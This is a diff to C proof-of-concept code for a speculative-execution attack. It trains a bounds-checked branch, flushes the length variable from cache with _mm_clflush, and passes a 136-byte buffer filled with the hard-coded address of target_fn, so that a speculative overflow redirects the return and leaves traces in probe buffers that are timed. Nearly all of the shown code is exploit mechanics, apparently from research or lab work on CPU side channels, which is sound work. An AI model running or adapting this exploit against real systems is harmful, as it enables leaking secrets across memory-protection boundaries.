@@ -20,8 +20,6 @@
 void target_fn(void) __attribute__((section(".targetfn")));
 void end_target_fn(void);
 
-// Use Global instead of local for easier flushing?
-int max_len = 12;
 
 /*
  * Defines the bandwidth we can communicate from speculative -> von neuman
@@ -98,16 +96,14 @@ void check_probes() {
     flush_probe_buf();
 }
 
+// Use Global instead of local for easier flushing?
+int max_len = 101;
 
 void branch(char* str, int len){
-    char local_str[12]= {
-            0x88,0x88,0x88,0x88,0x88,0x88,
-            0x88,0x88,0x88,0x88,0x88,0x88};
-
-    _mm_clflush(&max_len);
+    char local_str[101];
 
     if (len < max_len){
-        strcpy(local_str, str);
+        memcpy(local_str, str, len);
         return;
     } 
     return;
@@ -122,14 +118,26 @@ void train_branch(){
     }
 }
 
+/*
+ * The Address of target_fn is set in linker.ld to be 0x0000000000434040
+ * since these buffers will be aligned on the stack, just overwrite the 
+ * same thing everwhere, as this should happen speculatively and never 
+ * actually write onto stack.
+ */
 void trick_branch(){
-    char overflow[36] = {
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x44,0x44,0x44,0x44,
-            0x44,0x44,0x44,0x44,0x40,0x40,0x43,0x00
-        };
-    branch(overflow, 36);
+    int i;
+    char overflow[136];
+    for (i=0; i<136/8; i++) {
+        overflow[i*8+0]=0x40;
+        overflow[i*8+1]=0x40;
+        overflow[i*8+2]=0x43;
+        overflow[i*8+3]=0x00;
+        overflow[i*8+4]=0x00;
+        overflow[i*8+5]=0x00;
+        overflow[i*8+6]=0x00;
+        overflow[i*8+7]=0x00;
+    }
+    branch(overflow, 136);
 }
 
 void measure() {
@@ -148,6 +156,7 @@ void measure() {
             
             train_branch();
             flush_probe_buf_i();
+            _mm_clflush(&max_len);
             trick_branch();
             
         }
